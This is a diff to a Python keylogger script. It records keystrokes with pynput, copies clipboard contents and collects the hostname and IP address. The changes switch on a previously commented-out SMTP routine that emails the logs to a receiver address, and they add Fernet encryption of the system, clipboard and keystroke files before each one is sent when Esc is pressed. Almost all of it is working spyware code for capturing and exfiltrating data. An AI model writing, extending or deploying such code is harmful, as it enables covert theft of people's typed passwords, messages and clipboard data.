@@ -8,6 +8,8 @@ import smtplib
 import socket
 import platform
 
+from Cryptography import generateKey
+
 import win32clipboard
 
 from pynput.keyboard import Key, Listener
@@ -36,18 +38,21 @@ clipboard_information_e = "e_clipboard.txt"
 
 file_path = os.getcwd()
 extend = "\\Project\\"
+file_merge = file_path + extend
+
+key = generateKey.encryted_key
 
 count = 0
 keys = []
 
 #Email
 
-#email_address = input("Enter senders Email Address: ")
-#password = input("Enter App specific Password")
-#toaddr = input("Enter the reciver's Address: ")
-#attachment = file_path + extend + key_information
+email_address = input("Enter senders Email Address: ")
+password = input("Enter App specific Password")
+toaddr = input("Enter the reciver's Address: ")
+attachment = file_merge + key_information
 
-'''def send_email(filename, attachment, toaddr):
+def send_email(filename, attachment, toaddr):
 
     fromaddr = email_address
 
@@ -88,13 +93,13 @@ keys = []
 
     s.quit()
 
-send_email(key_information, attachment, toaddr)'''
+send_email(key_information, attachment, toaddr)
 
 
 #PC Information
 
 def pc_information():
-    with open(file_path + extend + system_information, "a") as f:
+    with open(file_merge + system_information, "a") as f:
         hostname = socket.gethostname()
         ipaddr = socket.gethostbyname(hostname)
         try:
@@ -115,7 +120,7 @@ pc_information()
 #Clipboard 
 
 def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
+    with open(file_merge + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -142,7 +147,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open(file_path + extend + key_information, "a") as f:
+    with open(file_merge + key_information, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
@@ -155,13 +160,29 @@ def write_file(keys):
 
 def on_release(key):
     if key == Key.esc:
+        #Encryption
+
+        count = 0
+
+        file_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + key_information]
+        encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + key_information_e]
+
+        for encrypting_files in file_to_encrypt:
+
+            with open(file_to_encrypt[count], 'rb') as f:
+                data = f.read()
+
+            fernet = Fernet(key)
+            encrypted = fernet.encrypt(data)
+
+            with open(encrypted_files_names[count], 'wb') as f:
+                f.write(encrypted)
+
+            send_email(encrypted_files_names[count], encrypted_files_names[count], toaddr)
+            count += 1
+
+        time.sleep(120)
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener: 
     listener.join()
-
-
-
-
-
-
